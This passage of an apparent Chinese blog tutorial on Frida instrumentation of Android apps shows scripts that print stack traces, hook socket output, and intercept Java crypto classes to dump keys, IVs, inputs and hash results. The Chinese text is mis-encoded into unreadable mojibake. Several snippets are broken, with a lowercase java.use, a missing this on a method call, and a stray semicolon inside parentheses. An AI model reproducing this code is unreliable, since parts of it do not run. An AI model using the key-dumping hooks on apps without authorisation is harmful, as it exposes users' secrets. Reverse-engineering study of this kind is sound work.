function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new());</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(throwable);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sample 2</span></span><br><span class="line">    <span class="keyword">var</span> exception = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new());</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(exception);</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;====== printStacks end ======== &quot;</span> + name + <span class="string">&quot;==============================&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å—ä¹Ÿå¯ä»¥é’ˆå¯¹ç‰¹å®šå‡½æ•°ï¼Œæ¥æ‰“å°å®ƒçš„è°ƒç”¨æ ˆã€‚</p><p>è¿™å—å¯¹ HookObjectç±»ä¸­çš„ stringTwoå‡½æ•°è¿›è¡Œhookï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407131950303.png" alt="image.png"> </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">HookedObject</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;om.forgotten.fridatestapp.HookedObject&quot;</span>);</span><br><span class="line">        <span class="title class_">HookedObject</span>.<span class="property">stringTwo</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="title function_">stringTwo</span>(arg);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//æ–¹æ³•ä¸€</span></span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Exception</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>);  <span class="comment">//è¿™å—å®šä¹‰ä¸€ä¸‹å¼‚å¸¸ç±»</span></span><br><span class="line">            <span class="keyword">var</span> e = <span class="title class_">Exception</span>.$new(<span class="string">&quot;StackTrace&quot;</span>);  <span class="comment">//æ•è·å¼‚å¸¸ç±»çš„æ„é€ å‡½æ•°</span></span><br><span class="line">            <span class="keyword">var</span> straces = e.<span class="title function_">getMessage</span>();   <span class="comment">//æ‰“å°æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–çš„å‚æ•°,è¿”å›å€¼æ˜¯ä¸€ä¸ªæ•°ç»„</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(straces.<span class="title function_">toString</span>())</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//æ–¹æ³•äºŒ</span></span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Log</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>);   <span class="comment">//å®šä¹‰ä¸€ä¸‹logç±»</span></span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Throwable</span> = java.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>);  <span class="comment">//å®šä¹‰å¼‚å¸¸ç±»Throwable</span></span><br><span class="line">            <span class="keyword">var</span> t = <span class="title class_">Throwable</span>.$new();   <span class="comment">//æ•è·å¼‚å¸¸ç±»çš„æ„é€ å‡½æ•°</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;StackTrace2&quot;</span>,<span class="title class_">Log</span>.<span class="title function_">getStackTraceString</span>(t));   <span class="comment">//æ‰“å°å †æ ˆ</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">//æ–¹æ³•ä¸‰</span></span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Log</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>);   <span class="comment">//å®šä¹‰ä¸€ä¸‹logç±»</span></span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Exception</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>);  <span class="comment">//è¿™å—å®šä¹‰ä¸€ä¸‹å¼‚å¸¸ç±»</span></span><br><span class="line">            <span class="keyword">var</span> e = <span class="title class_">Exception</span>.$new(<span class="string">&quot;StackTrace&quot;</span>);  <span class="comment">//æ•è·å¼‚å¸¸ç±»çš„æ„é€ å‡½æ•°</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;StackTrace3&quot;</span>,<span class="title class_">Log</span>.<span class="title function_">getStackTraceString</span>(e));   <span class="comment">//æ‰“å°å †æ ˆ</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><h2 id="9-è¯·æ±‚è°ƒç”¨æ ˆ"><a href="#9-è¯·æ±‚è°ƒç”¨æ ˆ" class="headerlink" title="9. è¯·æ±‚è°ƒç”¨æ ˆ"></a>9. è¯·æ±‚è°ƒç”¨æ ˆ</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> class_Socket = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.Socket&quot;</span>);</span><br><span class="line">class_Socket.<span class="property">getOutputStream</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">send</span>(<span class="string">&quot;getOutputSteam&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getOutputStream</span>();</span><br><span class="line">    <span class="keyword">var</span> bt = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new();</span><br><span class="line">    )</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Backtrace:&quot;</span> + bt);</span><br><span class="line">    <span class="title function_">send</span>(result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-å¸¸è§ç®—æ³•hook"><a href="#10-å¸¸è§ç®—æ³•hook" class="headerlink" title="10. å¸¸è§ç®—æ³•hook"></a>10. å¸¸è§ç®—æ³•hook</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> secretKeySpec = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.spec.SecretKeySpec&#x27;</span>);</span><br><span class="line">    secretKeySpec.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.$init(a, b);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;ç®—æ³•åï¼š&quot;</span> + b + <span class="string">&quot;|Decå¯†é’¥:&quot;</span> + <span class="title function_">bytesToString</span>(a));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;ç®—æ³•åï¼š&quot;</span> + b + <span class="string">&quot;|Hexå¯†é’¥:&quot;</span> + <span class="title function_">bytesToHex</span>(a));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> mac = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.Mac&#x27;</span>);</span><br><span class="line">    mac.<span class="property">getInstance</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getInstance</span>(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;ç®—æ³•åï¼š&quot;</span> + a);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    mac.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">update</span>(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;update:&quot;</span> + <span class="title function_">bytesToString</span>(a))</span><br><span class="line">    &#125;</span><br><span class="line">    mac.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a, b, c</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">update</span>(a, b, c)</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;update:&quot;</span> + <span class="title function_">bytesToString</span>(a) + <span class="string">&quot;|&quot;</span> + b + <span class="string">&quot;|&quot;</span> + c);</span><br><span class="line">    &#125;</span><br><span class="line">    mac.<span class="property">doFinal</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">doFinal</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinalç»“æœ:&quot;</span> + <span class="title function_">bytesToHex</span>(result));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinalç»“æœ:&quot;</span> + <span class="title function_">bytesToBase64</span>(result));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    mac.<span class="property">doFinal</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">doFinal</span>(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinalå‚æ•°:&quot;</span> + <span class="title function_">bytesToString</span>(a));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinalç»“æœ:&quot;</span> + <span class="title function_">bytesToHex</span>(result));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinalç»“æœ:&quot;</span> + <span class="title function_">bytesToBase64</span>(result));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> md = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.security.MessageDigest&#x27;</span>);</span><br><span class="line">    md.<span class="property">getInstance</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;ç®—æ³•åï¼š&quot;</span> + a);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">getInstance</span>(a, b);</span><br><span class="line">    &#125;</span><br><span class="line">    md.<span class="property">getInstance</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;ç®—æ³•åï¼š&quot;</span> + a);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">getInstance</span>(a);</span><br><span class="line">    &#125;</span><br><span class="line">    md.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;update:&quot;</span> + <span class="title function_">bytesToString</span>(a))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">update</span>(a);</span><br><span class="line">    &#125;</span><br><span class="line">    md.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a, b, c</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;update:&quot;</span> + <span class="title function_">bytesToString</span>(a) + <span class="string">&quot;|&quot;</span> + b + <span class="string">&quot;|&quot;</span> + c);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">update</span>(a, b, c);</span><br><span class="line">    &#125;</span><br><span class="line">    md.<span class="property">digest</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">digest</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;digestç»“æœ:&quot;</span> + <span class="title function_">bytesToHex</span>(result));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;digestç»“æœ:&quot;</span> + <span class="title function_">bytesToBase64</span>(result));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    md.<span class="property">digest</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;digestå‚æ•°:&quot;</span> + <span class="title function_">bytesToString</span>(a));</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">digest</span>(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;digestç»“æœ:&quot;</span> + <span class="title function_">bytesToHex</span>(result));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;digestç»“æœ:&quot;</span> + <span class="title function_">bytesToBase64</span>(result));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> ivParameterSpec = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.spec.IvParameterSpec&#x27;</span>);</span><br><span class="line">    ivParameterSpec.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.$init(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;ivå‘é‡:&quot;</span> + <span class="title function_">bytesToString</span>(a));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;ivå‘é‡:&quot;</span> + <span class="title function_">bytesToHex</span>(a));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> cipher = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.Cipher&#x27;</span>);</span><br><span class="line">    cipher.<span class="property">getInstance</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getInstance</span>(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;æ¨¡å¼å¡«å……:&quot;</span> + a);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">update</span>(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;update:&quot;</span> + <span class="title function_">bytesToString</span>(a));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a, b, c</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">update</span>(a, b, c);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;update:&quot;</span> + <span class="title function_">bytesToString</span>(a) + <span class="string">&quot;|&quot;</span> + b + <span class="string">&quot;|&quot;</span> + c);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.<span class="property">doFinal</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">doFinal</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinalç»“æœ:&quot;</span> + <span class="title function_">bytesToHex</span>(result));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinalç»“æœ:&quot;</span> + <span class="title function_">bytesToBase64</span>(result));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.<span class="property">doFinal</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">doFinal</span>(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinalå‚æ•°:&quot;</span> + <span class="title function_">bytesToString</span>(a));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinalç»“æœ:&quot;</span> + <span class="title function_">bytesToHex</span>(result));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinalç»“æœ:&quot;</span> + <span class="title function_">bytesToBase64</span>(result));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> x509EncodedKeySpec = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.security.spec.X509EncodedKeySpec&#x27;</span>);</span><br><span class="line">    x509EncodedKeySpec.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.$init(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;RSAå¯†é’¥:&quot;</span> + <span class="title function_">bytesToBase64</span>(a));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> rSAPublicKeySpec = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.security.spec.RSAPublicKeySpec&#x27;</span>);</span><br><span class="line">    rSAPublicKeySpec.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.math.BigInteger&#x27;</span>, <span class="string">&#x27;java.math.BigInteger&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.$init(a, b);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="comment">//send(&quot;RSAå¯†é’¥:&quot; + bytesToBase64(a));</span></span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;RSAå¯†é’¥N:&quot;</span> + a.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;RSAå¯†é’¥E:&quot;</span> + b.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="11-å¸¸è§è½¬æ¢æ¨¡æ¿"><a href="#11-å¸¸è§è½¬æ¢æ¨¡æ¿" class="headerlink" title="11. å¸¸è§è½¬æ¢æ¨¡æ¿"></a>11. å¸¸è§è½¬æ¢æ¨¡æ¿</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å·¥å…·ç›¸å…³å‡½æ•°</span></span><br><span class="line"><span class="keyword">var</span> base64EncodeChars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>,</span><br><span class="line">    base64DecodeChars = <span class="keyword">new</span> <span class="title class_">Array</span>((-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), <span class="number">62</span>, (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), <span class="number">63</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToBase64</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r, a, c, h, o, t;</span><br><span class="line">    <span class="keyword">for</span> (c = e.<span class="property">length</span>, a = <span class="number">0</span>, r = <span class="string">&#x27;&#x27;</span>; a &lt; c;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (h = <span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(a++), a == c) &#123;</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>(h &gt;&gt; <span class="number">2</span>),</span><br><span class="line">                r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">3</span> &amp; h) &lt;&lt; <span class="number">4</span>),</span><br><span class="line">                r += <span class="string">&#x27;==&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (o = e.<span class="title function_">charCodeAt</span>(a++), a == c) &#123;</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>(h &gt;&gt; <span class="number">2</span>),</span><br><span class="line">                r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">3</span> &amp; h) &lt;&lt; <span class="number">4</span> | (<span class="number">240</span> &amp; o) &gt;&gt; <span class="number">4</span>),</span><br><span class="line">                r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">15</span> &amp; o) &lt;&lt; <span class="number">2</span>),</span><br><span class="line">                r += <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        t = e.<span class="title function_">charCodeAt</span>(a++),</span><br><span class="line">            r 